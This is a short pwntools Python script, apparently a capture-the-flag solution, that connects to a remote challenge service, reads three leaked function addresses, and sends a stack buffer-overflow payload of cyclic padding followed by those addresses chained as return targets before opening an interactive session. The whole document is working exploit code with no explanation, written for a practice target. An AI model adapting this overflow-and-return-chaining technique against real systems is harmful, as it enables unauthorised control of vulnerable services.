from pwn import *

p = remote("ggcs-bh03.allyourbases.co", 1337)

print(p.recvuntil(": "))
three = int(p.recvuntil("\n"),16)
print("function three: ", hex(three))

print(p.recvuntil(": "))
two = int(p.recvuntil("\n"),16)
print("function two: ", hex(two))

print(p.recvuntil(": "))
one = int(p.recvuntil("\n"),16)
print("function one: ", hex(one))

print(p.recvuntil("you?"))

payload = cyclic(49-4) + p32(three) + p32(two) + p32(one) + p32(three)

p.sendline(payload)

p.interactive()